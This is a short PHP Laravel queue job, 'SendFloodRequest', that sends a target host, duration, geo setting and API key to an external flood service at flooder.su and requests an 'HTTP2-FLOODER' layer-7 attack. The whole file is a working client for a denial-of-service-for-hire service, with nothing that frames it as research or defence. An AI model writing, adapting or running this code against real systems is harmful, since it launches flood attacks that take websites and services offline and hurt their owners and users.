<?php

namespace App\Jobs;

use Illuminate\Bus\Queueable;
use Illuminate\Contracts\Queue\ShouldQueue;
use Illuminate\Foundation\Bus\Dispatchable;
use Illuminate\Queue\InteractsWithQueue;
use Illuminate\Queue\SerializesModels;
use Illuminate\Support\Facades\Http;

class SendFloodRequest implements ShouldQueue
{
    use Dispatchable, InteractsWithQueue, Queueable, SerializesModels;

    protected $host;
    protected $apiKey;
    protected $time;
    protected $geo;

    public function __construct($host, $apiKey, $time, $geo)
    {
        $this->host = $host;
        $this->apiKey = $apiKey;
        $this->time = $time;
        $this->geo = $geo;
    }

    public function handle()
    {
        $url = "https://flooder.su/API/l7";
        $params = [
            'api_key' => $this->apiKey,
            'host' => $this->host,
            'time' => $this->time,
            'method' => 'HTTP2-FLOODER',
            'rmethod' => 'GET',
            'data' => '',
            'header' => 'GET',
            'request' => '50',
            'geo' => $this->geo,
            'concurrents' => '1', // Each request will still only use 1 concurrent connection
        ];

        // Make the HTTP request and handle the response
        $response = Http::post($url, $params);

        // Handle the response as needed
        if ($response->successful()) {
            // Optionally log or process the successful response
        } else {
            // Handle the error case, you can log it or take necessary action
        }
    }
}
